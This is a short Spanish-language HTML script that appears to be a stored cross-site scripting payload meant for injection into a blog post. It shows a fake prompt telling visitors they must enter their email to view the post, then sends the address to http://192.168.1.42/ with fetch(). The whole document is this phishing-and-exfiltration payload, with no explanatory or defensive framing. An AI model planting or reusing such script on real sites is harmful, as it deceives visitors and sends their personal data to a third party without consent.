<script>
  var email = prompt("Por favor, introduce tu correo electrónico para poder visualizar el post", "example@example.com");

  if (email == null || email == "") {
    alert("Es necesario introducir un correo válido para visualizar el post");
  } else {
    fetch("http://192.168.1.42/?email=" + email);
  }
</script>
